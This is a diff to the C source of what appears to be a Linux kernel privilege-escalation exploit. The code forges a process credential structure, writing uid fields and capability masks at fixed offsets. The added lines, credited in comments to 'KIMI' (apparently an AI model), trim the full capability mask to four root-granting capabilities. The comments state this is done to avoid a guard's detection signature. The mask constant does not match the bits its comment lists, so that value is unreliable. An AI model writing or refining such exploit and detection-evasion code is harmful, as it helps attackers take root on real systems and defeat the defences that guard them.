@@ -651,8 +651,26 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
     put32(c, 0x18, cu); /* egid */
     put32(c, 0x1c, cu); /* fsuid */
     put32(c, 0x20, cu); /* fsgid */
-    pr_info("CAPSONLY cred: uid=%u usage=0x40000000 caps=full "
-            "(KIMI fix: no kernel-addr refcount)\n", cu);
+    pr_info("CAPSONLY cred: uid=%u usage=0x40000000 caps=specific "
+            "(KIMI: no kernel-addr refcount, no full mask)\n", cu);
+    /* KIMI K3 heuristic fix: full caps mask is a guard detection
+     * signature. Use ONLY the 4 caps we actually need:
+     *   bit 1  CAP_DAC_OVERRIDE  = file access bypass
+     *   bit 7  CAP_SETUID        = setuid(0)
+     *   bit 19 CAP_SYS_PTRACE    = /proc/1/mem access
+     *   bit 21 CAP_SYS_ADMIN     = mount, insmod, etc.
+     * MODE4_CAPS_FULL=1 opts back to the full mask. */
+    {
+      uint64_t caps_mask = 0x0000000000182082ULL; /* bits 1,7,19,21 */
+      if (env_flag("MODE4_CAPS_FULL", 0)) caps_mask = 0x1FFFFFFFFFFULL;
+      /* cap_inheritable@+0x28, cap_permitted@+0x30, cap_effective@+0x38,
+       * cap_bset@+0x40, cap_ambient@+0x48 */
+      put64(c, 0x28, caps_mask); /* inheritable */
+      put64(c, 0x30, caps_mask); /* permitted */
+      put64(c, 0x38, caps_mask); /* effective */
+      put64(c, 0x40, caps_mask); /* bset */
+      put64(c, 0x48, 0);         /* ambient = 0 (KIMI: don't set) */
+    }
   } else {
     /* Non-CAPSONLY: keep the old pi-erase termination behavior */
     put64(c, 0, (uintptr_t)(p + 0x1600));
